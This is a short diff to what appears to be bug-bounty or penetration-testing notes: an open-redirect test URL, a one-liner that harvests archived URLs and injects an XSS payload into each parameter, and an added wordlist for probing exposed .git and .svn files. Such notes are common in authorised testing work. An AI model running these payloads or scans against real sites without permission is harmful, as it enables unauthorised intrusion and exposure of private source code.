@@ -54,3 +54,18 @@ https://target[.]com///google[.]com/?qwerty  --> Redirects to google[.]com
 ```
 echo https://target.com | waybackurls | grep "=" | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|icon|pdf|svg|txt|js)" | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq
 ```
+# Dir-enum-list:
+```
+/.git
+/.git-rewrite
+/.git/HEAD
+/.git/index
+/.git/logs
+/.gitattributes
+/.gitconfig
+/.gitkeep
+/.gitmodules
+/.gitreview
+/.svn/entries
+/.svnignore
+```
